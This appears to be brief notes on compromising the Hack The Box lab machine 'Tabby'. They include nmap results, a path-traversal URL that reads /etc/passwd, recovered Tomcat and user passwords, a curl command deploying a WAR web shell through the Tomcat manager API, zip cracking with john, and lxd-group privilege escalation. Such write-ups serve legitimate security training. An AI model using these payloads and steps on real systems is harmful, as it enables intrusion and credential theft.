# tabby



## nmap

PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
|
80/tcp   open     http           Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
1113/tcp filtered ltp-deepspace
1244/tcp filtered isbconference1
2121/tcp filtered ccproxy-ftp
5811/tcp filtered unknown
6969/tcp filtered acmsoda
8080/tcp open     http           Apache Tomcat
|http-title: Apache Tomcat





## web

- There are 2 ports hosting services
  - web server at port 80
  - apache tomcat server at port 8080

- we can use local file inclusion at port 80 with address "http://megahosting.htb/news.php?file=../../../../etc/passwd" 
- we can get credentials from tomcat-users.xml

![image-20201108200103446](tabby.assets/image-20201108200103446.png)



#### credentials

```
tomcat	:	$3cureP4s5w0rd123!
```





## tomcat

- we have to deploy a war file with shell in it
- but as we cannot tomcat manager access from remote machine due to restriction we have to use tomcat api

![image-20201108203102601](tabby.assets/image-20201108203102601.png)

```bash
curl -u 'tomcat:$3cureP4s5w0rd123!' -T "cmdjsp.war" "http://10.10.10.194:8080/manager/text/deploy?path=/myapp"
```



- now we got some type of shell we can use it to get reverse shell

![image-20201108203332021](tabby.assets/image-20201108203332021.png)





## enumeration

- found a encrypted zip file in the files directory

![image-20201108204714224](tabby.assets/image-20201108204714224.png)



- using john to decrypt it

![image-20201108204821390](tabby.assets/image-20201108204821390.png)



##### credential

```
zip		admin@it
ash:admin@it
```



![image-20201108205119284](tabby.assets/image-20201108205119284.png)



## privesc

- we got a shell as user ash
- now for privilege escalation we will run linpeas

![image-20201108205721903](tabby.assets/image-20201108205721903.png)



- we are in lxd group as user ash we can use it to privesc

```
https://www.hackingarticles.in/lxd-privilege-escalation/
```

